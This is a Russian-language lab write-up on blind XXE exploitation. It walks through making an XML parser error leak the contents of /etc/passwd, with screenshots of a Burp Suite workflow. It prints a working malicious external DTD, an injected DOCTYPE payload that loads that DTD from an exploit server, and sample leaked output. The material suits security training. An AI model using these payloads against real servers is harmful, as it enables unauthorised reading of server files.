# –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è XXE –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è —Ñ–∞–π–ª–æ–≤, –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è SSRF –∏ —Ä–∞–±–æ—Ç—ã —Å–æ —Å–ª–µ–ø—ã–º XXE üö®

XXE (XML External Entity) ‚Äî —ç—Ç–æ —É—è–∑–≤–∏–º–æ—Å—Ç—å, –ø–æ–∑–≤–æ–ª—è—é—â–∞—è –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞–º –∏–∑–≤–ª–µ–∫–∞—Ç—å —Ñ–∞–π–ª—ã —Å —Å–µ—Ä–≤–µ—Ä–∞, –≤—ã–ø–æ–ª–Ω—è—Ç—å –∞—Ç–∞–∫–∏ SSRF –∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å "—Å–ª–µ–ø—ã–µ" —É—è–∑–≤–∏–º–æ—Å—Ç–∏ XXE. –≠—Ç–æ —Ä—É–∫–æ–≤–æ–¥—Å—Ç–≤–æ –æ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç –≤—Å–µ —ç—Ç–∏ —Å—Ü–µ–Ω–∞—Ä–∏–∏ —Å –ø–æ–¥—Ä–æ–±–Ω—ã–º–∏ –ø—Ä–∏–º–µ—Ä–∞–º–∏. üí°

---

## –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å–ª–µ–ø–æ–≥–æ XXE –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö —á–µ—Ä–µ–∑ —Å–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ—à–∏–±–∫–∞—Ö

–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –ø–æ–¥—Ö–æ–¥ –∫ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ —Å–ª–µ–ø–æ–≥–æ XXE –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –∑–∞–ø—É—Å–∫–µ –æ—à–∏–±–∫–∏ –∞–Ω–∞–ª–∏–∑–∞ XML, –≥–¥–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ —Å–æ–¥–µ—Ä–∂–∏—Ç –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ, –∫–æ—Ç–æ—Ä—ã–µ –≤—ã —Ö–æ—Ç–∏—Ç–µ –ø–æ–ª—É—á–∏—Ç—å. –≠—Ç–æ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ, –µ—Å–ª–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∏—Ä—É—é—â–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ –≤ —Å–≤–æ–µ–º –æ—Ç–≤–µ—Ç–µ.

### –ü—Ä–∏–º–µ—Ä –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ DTD

–í—ã –º–æ–∂–µ—Ç–µ –≤—ã–∑–≤–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ –∞–Ω–∞–ª–∏–∑–∞ XML, —Å–æ–¥–µ—Ä–∂–∞—â–µ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞ `/etc/passwd`, –∏—Å–ø–æ–ª—å–∑—É—è —Å–ª–µ–¥—É—é—â–∏–π –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –≤–Ω–µ—à–Ω–∏–π DTD:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

–≠—Ç–æ—Ç DTD –≤—ã–ø–æ–ª–Ω—è–µ—Ç —Å–ª–µ–¥—É—é—â–∏–µ —à–∞–≥–∏:

1. –û–ø—Ä–µ–¥–µ–ª—è–µ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–µ—Å–∫—É—é —Å—É—â–Ω–æ—Å—Ç—å `file`, —Å–æ–¥–µ—Ä–∂–∞—â—É—é —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞ `/etc/passwd`.
2. –û–ø—Ä–µ–¥–µ–ª—è–µ—Ç —Å—É—â–Ω–æ—Å—Ç—å `eval`, –∫–æ—Ç–æ—Ä–∞—è –æ–±—ä—è–≤–ª—è–µ—Ç –¥—Ä—É–≥—É—é –¥–∏–Ω–∞–º–∏—á–µ—Å–∫—É—é –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–µ—Å–∫—É—é —Å—É—â–Ω–æ—Å—Ç—å `error`. –°—É—â–Ω–æ—Å—Ç—å `error` –ø—ã—Ç–∞–µ—Ç—Å—è –∑–∞–≥—Ä—É–∑–∏—Ç—å –Ω–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π —Ñ–∞–π–ª, –∏–º—è –∫–æ—Ç–æ—Ä–æ–≥–æ –≤–∫–ª—é—á–∞–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ —Å—É—â–Ω–æ—Å—Ç–∏ `file`.
3. –ò—Å–ø–æ–ª—å–∑—É–µ—Ç —Å—É—â–Ω–æ—Å—Ç—å `eval`, —á—Ç–æ–±—ã –æ–±—ä—è–≤–∏—Ç—å —Å—É—â–Ω–æ—Å—Ç—å `error`.
4. –í—ã–∑—ã–≤–∞–µ—Ç —Å—É—â–Ω–æ—Å—Ç—å `error`, —á—Ç–æ –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –ø–æ–ø—ã—Ç–∫–µ –∑–∞–≥—Ä—É–∑–∏—Ç—å –Ω–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π —Ñ–∞–π–ª, —á—Ç–æ –≤—ã–∑—ã–≤–∞–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ, —Å–æ–¥–µ—Ä–∂–∞—â–µ–µ –∏–º—è —Ñ–∞–π–ª–∞ ‚Äî —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏ —Ä–∞—Å–∫—Ä—ã–≤–∞—è —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ `/etc/passwd`.

–ó–∞–ø—É—Å–∫ —ç—Ç–æ–≥–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –≤–Ω–µ—à–Ω–µ–≥–æ DTD –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ —Å–æ–æ–±—â–µ–Ω–∏—é –æ–± –æ—à–∏–±–∫–µ, –ø–æ–¥–æ–±–Ω–æ–º—É —Å–ª–µ–¥—É—é—â–µ–º—É:
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

---

## –ü—Ä–∏–º–µ—Ä –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω–æ–π —Ä–∞–±–æ—Ç—ã

–í —ç—Ç–æ–π –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω–æ–π —Ä–∞–±–æ—Ç–µ —Ñ—É–Ω–∫—Ü–∏—è ¬´–ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–ø–∞—Å–æ–≤¬ª –∞–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ XML, –Ω–æ –Ω–µ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç.

–î–ª—è —Ä–µ—à–µ–Ω–∏—è –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω–æ–π —Ä–∞–±–æ—Ç—ã –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –≤–Ω–µ—à–Ω–∏–π DTD, —á—Ç–æ–±—ã –≤—ã–∑–≤–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ, –æ—Ç–æ–±—Ä–∞–∂–∞—é—â–µ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞ `/etc/passwd`.

–õ–∞–±–æ—Ä–∞—Ç–æ—Ä–∏—è –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç —Å—Å—ã–ª–∫—É –Ω–∞ —Å–µ—Ä–≤–µ—Ä —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤ –Ω–∞ –¥—Ä—É–≥–æ–º –¥–æ–º–µ–Ω–µ, –≥–¥–µ –≤—ã –º–æ–∂–µ—Ç–µ —Ä–∞–∑–º–µ—Å—Ç–∏—Ç—å —Å–≤–æ–π –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π DTD.

### –®–∞–≥–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è

### 1. –í—ã–±–æ—Ä –ø—Ä–æ–¥—É–∫—Ç–∞
–û—Ç–∫—Ä–æ–π—Ç–µ —Å–ø–∏—Å–æ–∫ –ø—Ä–æ–¥—É–∫—Ç–æ–≤ –∏ –≤—ã–±–µ—Ä–∏—Ç–µ –ª—é–±–æ–π –∏–∑ –Ω–∏—Ö:

![–°–ø–∏—Å–æ–∫ –ø—Ä–æ–¥—É–∫—Ç–æ–≤](https://github.com/user-attachments/assets/420f18e2-6900-4413-81f2-7cc5c6103444)

---

### 2. –ù–∞–∂–∞—Ç–∏–µ –∫–Ω–æ–ø–∫–∏
–ù–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –ø—Ä–æ–¥—É–∫—Ç–∞ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É **"–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –Ω–∞–ª–∏—á–∏–µ –Ω–∞ —Å–∫–ª–∞–¥–µ"**, –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ –≤–∫–ª—é—á–∏–≤ –ø—Ä–æ–∫—Å–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, Burp Suite):

![–ö–Ω–æ–ø–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–∞–ª–∏—á–∏—è](https://github.com/user-attachments/assets/c12710e3-0520-47a9-b507-1bb41849a7df)

---

### 3. –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ DTD
–ó–∞–≥—Ä—É–∑–∏—Ç–µ —Å–ª–µ–¥—É—é—â–∏–π —Ñ–∞–π–ª –Ω–∞ —Å–µ—Ä–≤–µ—Ä —ç–∫—Å–ø–ª–æ–π—Ç–æ–≤:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

![–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ DTD](https://github.com/user-attachments/assets/11ff29f8-5837-4372-900b-a9d5bbddcdd9)

---

### 4. –ü–µ—Ä–µ—Ö–≤–∞—Ç –∑–∞–ø—Ä–æ—Å–∞
–ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ **Proxy ‚Üí HTTP History**, –≤—ã–±–µ—Ä–∏—Ç–µ POST-–∑–∞–ø—Ä–æ—Å –∫ `/product/stock` –∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –µ–≥–æ –≤ **Repeater**:

![POST-–∑–∞–ø—Ä–æ—Å](https://github.com/user-attachments/assets/1a3d72b0-4f86-4a0f-8a3f-d488517695b2)

---

### 5. –í—Å—Ç–∞–≤–∫–∞ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
–î–æ–±–∞–≤—å—Ç–µ —Å–ª–µ–¥—É—é—â–µ–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –≤–Ω–µ—à–Ω–µ–π —Å—É—â–Ω–æ—Å—Ç–∏ –º–µ–∂–¥—É –¥–µ–∫–ª–∞—Ä–∞—Ü–∏–µ–π XML –∏ —ç–ª–µ–º–µ–Ω—Ç–æ–º `stockCheck`:
```xml
<!DOCTYPE foo [<!ENTITY % eyes SYSTEM "YOUR-DTD-URL"> %eyes;]>
```

![–í—Å—Ç–∞–≤–∫–∞ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏](https://github.com/user-attachments/assets/0e7f5ee1-ca87-4bf9-ac69-5d11b894fba8)

---

### 6. –ü–æ–ª—É—á–µ–Ω–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞
–°–æ–¥–µ—Ä–∂–∏–º–æ–µ `/etc/passwd` –¥–æ–ª–∂–Ω–æ –ø–æ—è–≤–∏—Ç—å—Å—è –≤ —Å–æ–æ–±—â–µ–Ω–∏–∏ –æ–± –æ—à–∏–±–∫–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è:

![–†–µ–∑—É–ª—å—Ç–∞—Ç /etc/passwd](https://github.com/user-attachments/assets/70fb7b7c-fa39-4c23-be4d-b5d2e10d6c9f)
